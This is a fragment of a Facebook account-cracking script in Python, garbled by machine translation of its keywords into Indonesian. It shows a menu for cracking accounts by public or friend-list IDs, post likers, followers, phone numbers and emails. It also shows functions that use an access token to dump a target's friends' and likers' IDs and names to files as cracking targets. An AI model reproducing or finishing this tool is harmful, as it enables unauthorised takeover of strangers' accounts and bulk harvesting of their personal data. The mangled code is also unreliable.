...
def  ige ():
    ...
    os . sistem ( "xdg-buka https://www.instagram.com/bangsat_xd" )
    masukan ( p + " [KEMBALI]" )
    log ()   
...
### MENU UTAMA ###
 ...
 menu def ():
    ...
    kecuali  Pengecualian  sebagai  e :
        ...
        log ()
    ip  =  permintaan . dapatkan ( "https://api.ipify.org" ). teks
    os . sistem ( "jelas" )
    spanduk ()
    ...
    print (( p + " \n [" + k + "01" + p + "]" + p + " Crack ID Dari Publik/Friendlist" ))
    print (( p + " [" + k + "02" + p + "]" + p + " Crack ID Dari Likers Post" ))
    print (( p + " [" + k + "03" + p + "]" + p + " Crack ID Dari Followers" ))
    print (( p + " [" + k + "04" + p + "]" + p + " Crack Nomor Telepon" ))
    print (( p + " [" + k + "05" + p + "]" + p + " Crack Email" ))
    print (( p + " [" + k + "06" + p + "]" + p + " Periksa Opsi Akun Checkpoint" ))
    print (( p + " [" + k + "99" + p + "]" + p + " Hasil Retak" ))
    cetak (( p + " [" + k + "00" + p + "]" + p + " Keluar " ))
    pilih_menu ()
...
def  pilihcrack ( file ):
  ...
  print (( p + " [" + k + "03" + p + "] Retak Dengan Mbasic.Facebook" ))
...
def  publik ():
	...
	kecuali  IOError :
		...
		log ()
	coba :
		print (( p + " \n [" + k + "•" + m + "•" + p + "] Ketik \' saya \' Dump From Friendlist" ))
		idt  =  masukan ( p + " [" + k + "•" + m + "•" + p + "] Target ID Pengguna: " )
		coba :
		...
		kecuali  KeyError :
			...
			cetak (( p + " \n [KEMBALI]" + p ))
			menu ()
		r = permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "/friends?limit=10000&access_token=" + toket )
		identitas  = []
		z = json . beban ( r . teks )
		qq  = ( op [ "nama_depan" ] + ".json" ). ganti ( " " , "_" )
		ys  =  buka ( qq , "w" ) #.replace(" ","_")
		untuk  a  dalam  z [ "data" ]:
			id . tambahkan ( a [ "id" ] + "<=>" + a [ "nama" ])
			ya . tulis ( a [ "id" ] + "<=>" + a [ "nama" ] + " \n " )
		ya . tutup ()
...
def  Likers ():
	...
	coba :
		...
		kecuali  KeyError :
			...
			cetak (( p + " \n [KEMBALI]" + p ))
			menu ()
		r = permintaan . dapatkan ( "https://graph.facebook.com/" + idt + "/likes?limit=100000&access_token=" + toket )
		identitas  = []
		z = json . beban ( r . teks )
		qq  = ( op [ "nama_depan" ] + ".json" ). ganti ( " " , "_" )
		ys  =  buka ( qq , "w" ) #.replace(" ","_")
